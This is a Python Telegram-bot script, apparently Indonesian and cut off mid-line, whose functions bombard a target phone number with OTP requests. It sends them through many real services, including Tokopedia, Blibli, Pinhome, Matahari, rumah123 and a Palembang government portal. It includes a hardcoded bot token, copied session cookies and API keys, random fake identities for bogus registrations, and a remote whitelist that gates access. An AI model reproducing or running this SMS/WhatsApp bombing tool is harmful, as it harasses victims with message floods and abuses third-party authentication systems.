#!/usr/bin/env python3

import os
import sys
import time
import json
import requests
import random
import string
import asyncio
import re
import random
import socket
import subprocess
import hashlib
import base64
import uuid
import phonenumbers
import smtplib
import asyncio
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor

from flask import Flask, request

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    from telegram.constants import ParseMode
except ImportError:
    os.system('pip install python-telegram-bot phonenumbers --upgrade')
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
    from telegram.constants import ParseMode


BOT_TOKEN = "8685515038:AAEW_N4J98oYLIMpP71Fc9W99ha7nR4mJAs"
ADMIN_ID = 8873967955
REPO_UID = "https://raw.githubusercontent.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6/main/Uid.txt"
USER_DATA_FILE = "users.json"


BANNER_URL = "https://d.top4top.io/p_389696phh0.jpg"
SPAM_OTP_IMG = "https://k.top4top.io/p_3896z2sip0.jpg"
IMAGE_LIST = [
    "https://c.top4top.io/p_3896q0h610.jpg",
    "https://i.top4top.io/p_389677e070.jpg",
    "https://k.top4top.io/p_38964hno90.jpg",
    "https://e.top4top.io/p_3896go3210.jpg",
]

def get_image():
    return random.choice(IMAGE_LIST)

IMAGE = get_image()


BI = '\033[44m'
TP = '\033[1;37m'
RESET = '\033[0m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
N = '\033[0m'
RS = '\033[0m'
PU = '\033[35m'
M = '\033[91m'
H = '\033[92m'
K = '\033[93m'
B = '\033[94m'
U = '\033[95m'
C = '\033[96m'
P = '\033[97m'
a = '\033[1;30m'
Grey = '\033[90m'
BM = '\033[41m'
BH = '\033[42m'
BK = '\033[43m'
BB = '\033[44m'
BU = '\033[45m'
BC = '\033[46m'
BP = '\033[47m'



def load_users():
    users = {}
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, 'r') as f:
                users = json.load(f)
        except:
            pass
    return users

def save_users(users):
    try:
        with open(USER_DATA_FILE, 'w') as f:
            json.dump(users, f, indent=2)
        return True
    except:
        return False

def get_uid():
    try:
        whoami = subprocess.check_output(['whoami'], stderr=subprocess.DEVNULL).decode().strip()
        if whoami:
            return hashlib.md5(whoami.encode()).hexdigest()[:12]
    except:
        pass
    return socket.gethostname()

def load_database():
    try:
        resp = requests.get(REPO_UID, timeout=10)
        if resp.status_code == 200:
            lines = resp.text.strip().splitlines()
            users = []
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split('|')
                    if len(parts) >= 3:
                        users.append({
                            "uid": parts[0].strip(),
                            "nama": parts[1].strip(),
                            "status": "active" if parts[2].strip() == "1" else "pending"
                        })
                    elif len(parts) == 2:
                        users.append({
                            "uid": parts[0].strip(),
                            "nama": parts[1].strip(),
                            "status": "active"
                        })
            return {"users": users}
        return None
    except:
        return None

def cek_uid(uid):
    db = load_database()
    if not db:
        return None, None
    users = db.get("users", [])
    for user in users:
        if user.get("uid") == uid:
            if user.get("status") == "active":
                return True, user
            return False, user
    return False, None

# ===================== FORMAT OUTPUT =====================

def format_time():
    return datetime.now().strftime('%H:%M:%S - %d/%m/%Y')

def format_loading(text):
    return f"⏱️⏳ Mohon bersabar Sedang {text}..."

def format_success(title, details):
    return (
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ *{title}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 {format_time()}\n\n"
        f"{details}"
    )

def format_error(msg):
    return (
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"❌ *Error*\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{msg}"
    )

# ===================== FUNGSI SPAM OTP =====================

def spam_otp_sidemang(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        import random
        import string

        nama = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        email = f"{nama}{random.randint(100, 999)}@gmail.com"

        url = 'https://sidemang.palembang.go.id/api/users/register/send-otp'

        headers = {
            'Content-Type': 'application/json',
            'origin': 'https://sidemang.palembang.go.id',
            'referer': 'https://sidemang.palembang.go.id/register-otp',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }

        payload = {
            "phoneNumber": nomor,
            "email": email
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_adiraku(nomor):
     try:
        if nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('0'):
            nomor_lokal = nomor
        else:
            nomor_lokal = '0' + nomor

        url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
        headers = {
            'Content-Type': 'application/json; charset=utf-8'
        }
        payload = {
            'mobileNumber': nomor_lokal,
            'type': 'prospect-create',
            'channel': 'whatsapp'
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

     except Exception as e:
        return False

def spam_otp_tokopedia(nomor):
      try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
      except:
        return False

def spam_otp_singa(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_singa_kedua(nomor):
    try:
        url = 'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return False

def spam_otp_singa_wa(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        else:
            if nomor.startswith('+62'):
                nomor = nomor[1:]
            else:
                if not nomor.startswith('62'):
                    nomor = '62' + nomor
        session = requests.Session()
        headers = {'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36'}
        resp = session.post('https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=143&model=SM-S928B&systemVersion=14&platform=android&appsflyer_id=', json={'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '\"msg\":\"', '\"') == 'Success'
    except:
        return False

def spam_otp_pinhome(nomor):
    try:
        import re

        if nomor.startswith('0'):
            nomor_lokal = nomor
        elif nomor.startswith('62'):
            nomor_lokal = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor_lokal = '0' + nomor[3:]
        else:
            nomor_lokal = '0' + nomor

        session = requests.Session()

        r0 = session.get('https://www.pinhome.id/daftar',
            headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
            },
            timeout=10
        )

        if r0.status_code != 200:
            return False

        csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', r0.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        else:
            csrf_token = session.cookies.get('_X7kCsrf')
            if not csrf_token:
                return False

        url = 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp'

        headers = {
            'Content-Type': 'text/plain;charset=UTF-8',
            'x-csrf-token': csrf_token,
            'origin': 'https://www.pinhome.id',
            'referer': 'https://www.pinhome.id/daftar',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'accept': '*/*'
        }

        payload = {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except Exception as e:
        return False

def spam_otp_duniagames(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif nomor.startswith('+62'):
            nomor = nomor
        else:
            nomor = '+62' + nomor

        device = str(uuid.uuid4())

        url = 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id',
            'ciam-type': 'FR',
            'content-length': '58',
            'content-type': 'application/json',
            'origin': 'https://duniagames.co.id',
            'priority': 'u=1, i',
            'referer': 'https://duniagames.co.id/',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-device': device
        }

        payload = {
            "phoneNumber": nomor,
            "userName": nomor[1:]
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get('code') == 200 or data.get('status') == 'success':
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False


def spam_otp_acc(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        next_action = "7f8e862fff4b3a97ae5e866780a086283a999e8a7f"
        next_router = "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"

        curl_cmd = f"""curl -s -X POST 'https://www.acc.co.id/register/new-account' \\
  -H 'Host: www.acc.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'next-action: {next_action}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'next-router-state-tree: {next_router}' \\
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'Accept: text/x-component' \\
  -H 'Content-Type: text/plain;charset=UTF-8' \\
  -H 'Origin: https://www.acc.co.id' \\
  -H 'Sec-Fetch-Site: same-origin' \\
  -H 'Sec-Fetch-Mode: cors' \\
  -H 'Sec-Fetch-Dest: empty' \\
  -H 'Referer: https://www.acc.co.id/register/new-account' \\
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \\
  -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'Cookie: _gcl_gs=2.1.k1$i1783212550$u132089247; _gcl_aw=GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB; _ga=GA1.1.2146116177.1783212563; _fbp=fb.2.1783212567536.574928455222574690; acw_tc=0a0a131517868956750878858e541f01b7d928d2a585326a758c753a2cc50e; deviceId=Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; _ga_HSTJBSDEEW=GS2.1.s1786895689$o3$g0$t1786895689$j60$l0$h0; _uetsid=d03ca050998a11f18069e52179483202; _uetvid=5d56eab0780b11f1b98421a5d543c1a8; mp_e88342495971d35d9d9164ffba696eec_mixpanel=%7B%22distinct_id%22%3A%22%24device%3Acf86d193-c59e-4187-be14-77874755733f%22%2C%22%24device_id%22%3A%22cf86d193-c59e-4187-be14-77874755733f%22%2C%22%24search_engine%22%3A%22google%22%2C%22utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22utm_medium%22%3A%22Pmax%201%22%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%2C%22__mps%22%3A%7B%7D%2C%22__mpso%22%3A%7B%22initial_utm_source%22%3A%22LAL%20Prospek%20IN%20Valid%20MGU%20Mar-Apr%22%2C%22initial_utm_medium%22%3A%22Pmax%201%22%2C%22initial_utm_campaign%22%3Anull%2C%22initial_utm_content%22%3Anull%2C%22initial_utm_term%22%3Anull%2C%22initial_utm_id%22%3Anull%2C%22initial_utm_source_platform%22%3Anull%2C%22initial_utm_campaign_id%22%3Anull%2C%22initial_utm_creative_format%22%3Anull%2C%22initial_utm_marketing_tactic%22%3Anull%2C%22%24initial_referrer%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%22www.google.com%22%7D%2C%22__mpus%22%3A%7B%7D%2C%22__mpa%22%3A%7B%7D%2C%22__mpu%22%3A%7B%7D%2C%22__mpr%22%3A%5B%5D%2C%22__mpap%22%3A%5B%5D%7D; _gcl_au=1.1.612971413.1783212562.2099357529.1786895693.1786895726.1390151220.1786895693.1786895726' \\
  --data-raw '[{{"user_id":null,"action":"register","send_to":"{phone}","provider":"whatsapp"}}]'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data and len(data) > 0:
                    if data[0].get('success'):
                        return True
                    if data[0].get('message') and 'otp' in str(data[0].get('message')).lower():
                        return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_acc_kedua(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]
        else:
            nomor = '0' + nomor

        nomor = ''.join(filter(str.isdigit, nomor))

        if len(nomor) < 10:
            return False

        session = requests.Session()

        cookies = {
            '_gcl_gs': '2.1.k1$i1783212550$u132089247',
            '_gcl_aw': 'GCL.1783212563.Cj0KCQjw3qLSBhDaARIsAFTiVh61CRKOfc78DkMYKO17cJqYH3QufK-mr9kpJU1bBxYt1tD6nnokC0oaAuAWEALw_wcB',
            '_ga': 'GA1.1.2146116177.1783212563',
            '_fbp': 'fb.2.1783212567536.574928455222574690',
            'acw_tc': '0a0a01e217835298403947009e4f1c9a16075729b378a863551f2fa9c47ee0',
            'deviceId': 'Mozilla%2F5.0%20(Linux%3B%20Android%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F149.0.0.0%20Mobile%20Safari%2F537.36',
            '_ga_HSTJBSDEEW': 'GS2.1.s1783529854$o2$g0$t1783529854$j60$l0$h0',
            '_uetsid': '1e3f09507aee11f1b6543d17dd2ca805',
            '_uetvid': '5d56eab0780b11f1b98421a5d543c1a8',
            '_gcl_au': '1.1.612971413.1783212562.2026417872.1783529859.1783529963'
        }

        session.cookies.update(cookies)

        headers_base = {
            'Accept': 'text/x-component',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://www.acc.co.id',
            'Referer': 'https://www.acc.co.id/register/new-account',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        }

        headers = headers_base.copy()
        headers['next-action'] = '7fd7799322a505bdfacd0dcd6cac5aa319e2350972'
        headers['next-router-state-tree'] = '%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D'

        payload = [
            {
                "user_id": None,
                "action": "register",
                "send_to": nomor,
                "provider": "whatsapp"
            }
        ]

        resp = session.post('https://www.acc.co.id/register/new-account',
            headers=headers,
            json=payload,
            timeout=10
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data and len(data) > 0:
                    result = data[0]
                    if result.get('success'):
                        return True
                    else:
                        return False
                else:
                    return True
            except:
                if 'Server action not found' in resp.text:
                    return False
                return True if resp.status_code == 200 else False
        else:
            return False

    except Exception as e:
        return False

def spam_otp_absenku(nomor):
      try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        session.get(
            "https://registrasi.absenku.com/index.php/register/index/2",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        session.post(
            "https://registrasi.absenku.com/index.php/register/validasi_trial",
            data={
                "nama": "Nama Lengkap",
                "email": "email@gmail.com",
                "telp": nomor,
                "company_name": "PT Test",
                "jumlah": "10",
                "tujuan": "1",
                "paket": "21",
                "ci_csrf_token": ""
            },
            headers=headers,
            timeout=10
        )

        resp = session.get(
            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
            params={"telp": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
      except:
        return False

def spam_otp_saturdays(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'authorization': "undefined",
            'device-type': "mweb",
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'x-api-key': "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
            'sec-ch-ua-mobile': "?1",
            'country-code': "ID",
            'currency-code': "IDR",
            'platform': "mweb",
            'origin': "https://saturdays.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://saturdays.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i"
        }

        payload = {
            "number": nomor_lokal,
            "country_code": "+62",
            "type": "WHATSAPP"
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
     except:
        return False

def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '0' + nomor
        elif nomor.startswith('62'):
            nomor = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            nomor = '0' + nomor[3:]

        nomor = ''.join(filter(str.isdigit, nomor))

        if len(nomor) < 10:
            return False

        url = 'https://api.maulagi.id/api/v2/auth/check'

        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'x-ml-key': 'C43BBQWN43',
            'origin': 'https://maulagi.id',
            'referer': 'https://maulagi.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }

        payload = {"credentials": nomor}

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_bliblitiket(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            nomor = '+' + nomor
        elif not nomor.startswith('+62'):
            nomor = '+62' + nomor
        session = requests.Session()
        headers = {'accept': '*/*', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'x-channel-id': 'MWEB', 'x-client-id': '3ca1ed67701249861819ba4850f4f135', 'x-entity': 'BLIBLI', 'x-lang': 'id', 'x-request-id': spam_otp_codex(36), 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
        session.get('https://account.bliblitiket.com/register', headers={'user-agent': headers['user-agent']}, timeout=10)
        nomor_encoded = nomor.replace('+', '%2B')
        session.get(f'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/registration/status?identity={nomor_encoded}&doMigration=false', headers=headers, timeout=10)
        headers['content-type'] = 'text/plain;charset=UTF-8'
        headers['origin'] = 'https://account.bliblitiket.com'
        headers['referer'] = 'https://account.bliblitiket.com/register'
        headers['x-request-id'] = spam_otp_codex(36)
        resp = session.post('https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate', data='{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"' + nomor + '","recaptchaToken":""}', headers=headers, timeout=10)
    except:
        return False

def spam_otp_matahari(nomor):
      try:
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        else:
            nomor_lokal = nomor              

        import random
        import string
        random_email = f"user{random.randint(100000,999999)}@gmail.com"
        random_name = f"User{random.randint(100,999)}"
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + "._", k=16))

        session = requests.Session()
        url = "https://matahari-backend-prod.matahari.com/api/auth/register"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br",
            'Content-Type': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'Origin': "https://matahari.com",
            'Sec-Fetch-Site': "same-site",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Dest': "empty",
            'Referer': "https://matahari.com/",
            'Accept-Language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        payload = {
            "emailAddress": random_email,
            "name": random_name,
            "mobileCountryCode": "",
            "mobileNumber": nomor_lokal,
            "birthDate": "2000-01-01",
            "genderId": "1",
            "password": random_password,
            "cardNumber": "",
            "referralCode": "",
            "salesmanId": "",
            "pickupStoreCode": "",
            "marketingCode": ""
        }

        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
      except:
        return False

def spam_otp_rumah123(nomor):
     try:
        if nomor.startswith("0"):
            nomor_lokal = "62" + nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor
        else:
            nomor_lokal = "62" + nomor

        session = requests.Session()
        url = "https://www.rumah123.com/api/otp/request-otp"

        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip, deflate, br",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
            'content-type': "application/json;charset=UTF-8",
            'sec-ch-ua-mobile': "?1",
            'base-url-core': "https://www.rumah123.com",
            'origin': "https://www.rumah123.com",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.rumah123.com/user/login?redirect=https://www.rumah123.com/",
            'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "ajs_anonymous_id=962b0766-64e4-493c-ae48-e59524822742; _ga=GA1.1.533350590.1780038198; _fbp=fb.1.1780038199360.807614422108834462; _tt_enable_cookie=1; _ttp=01KSS8PT9AQ=2N85JA4NBZ289F_.tt.1; __gads=ID=6ca90e1a33b998e9:T=1780045927:RT=1780045927:S=ALNI_Mb48=zdld8fUzNTj2mKtzcuQteMfQ; __gpi=UID=000014381fc3b087:T=1780045927:RT=1780045927:S=ALNI_MbWUjDmbUHcU-lmpT4CdYzH88d6yw; __eoi=ID=c85668bfa6f5416c:T=1780045927:RT=1780045927:S=AA-AfjZDUEoWxpdAvxXN4ehDANSQ; enquiry_data={\"email\":\"Jokowi@gmail.com\",\"isEverTickMortgage\":false,\"isVerified\":false,\"name\":\"Bray\",\"otpExpiredTime\":1780046220580,\"phoneNumber\":\"6285757102633\",\"requestOTPTime\":1780048557646}; 99group=s%3Accfa8db0-50f5-4e86-8aeb-35622f2b2cc0.G%2FYccepBgrnc6CJZvAPejEIwPe0jzpnoIjF3bvdL35s; _cfuvid=JIxmpGlboMHKgIlCU_H9Oc5=kw9ZYv9H8Mgr0B2FOec-1780182128.8329046-1.0.1.1-hIBwtBRvNB1Bv5_PsQGgwwAgoLU8KCBhSa6g9Abs9.Q; _clck=1n8grzt%5E2%5Eg6h%5E0%5E2340; flag_data={\"showAppsDownloadBanner\":true}; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%22e1507b7e-d15b-40ef-b408-d0cc88941c59%5C%22%2C%5B1780038190%2C882000000%5D%5D%22%5D%5D%5D; 